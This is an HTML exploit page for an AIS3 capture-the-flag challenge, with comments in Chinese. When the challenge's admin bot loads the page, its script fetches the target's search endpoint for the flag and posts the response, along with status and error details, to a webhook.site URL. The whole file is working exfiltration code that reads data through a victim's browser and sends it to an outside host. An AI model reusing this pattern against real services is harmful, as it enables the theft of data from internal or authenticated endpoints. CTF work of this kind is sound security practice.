<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-fs8">
    <title>Exploit Page</title>
</head>
<body>
    <p>Attempting to exfiltrate data... Check your webhook.</p>
    <script>
        const WEBHOOK_URL = "https://webhook.site/eed6e086-4677-4691-8515-ecf1b5559f63"; // <-- 重要：確認這是你正確的 Webhook URL
        const targetSearchURL = "http://chals1.ais3.org:5000/search?q=AIS3"; // 我們要找包含 "AIS3" 的句子，因為 flag 格式是 AIS3{...}

        async function sendToWebhook(data) {
            try {
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(data),
                    mode: 'cors' // 即使是到 webhook.site，也明確指定模式
                });
                console.log("Data/Error successfully sent to webhook:", data);
            } catch (e) {
                console.error("CRITICAL: Failed to send to webhook:", e);
                // 如果連到 webhook 都失敗，很難從這裡進一步調試
            }
        }

        async function runExploit() {
            // 測試訊息：確認 exploit.html 被加載並執行 JS
            await sendToWebhook({ status: "loaded", timestamp: new Date().toISOString(), message: "Exploit.html loaded by admin bot." });

            try {
                const response = await fetch(targetSearchURL);
                
                // 檢查 response.ok 是否為 true
                if (!response.ok) {
                    // 嘗試獲取錯誤回應的文本內容，可能包含線索
                    const errorText = await response.text().catch(() => "Could not get error response text.");
                    throw new Error(`HTTP error ${response.status} when fetching ${targetSearchURL}. Response body: ${errorText}`);
                }
                
                const responseData = await response.json(); // 伺服器 /search 返回的是 JSON
                await sendToWebhook({ status: "success", timestamp: new Date().toISOString(), searchResult: responseData });

            } catch (error) {
                console.error("Exploit caught an error:", error);
                // 將詳細錯誤信息發送到 webhook 以便調試
                await sendToWebhook({ 
                    status: "error", 
                    timestamp: new Date().toISOString(), 
                    errorName: error.name,
                    errorMessage: error.message, 
                    errorStack: error.stack 
                });
            }
        }

        runExploit();
    </script>
</body>
</html>

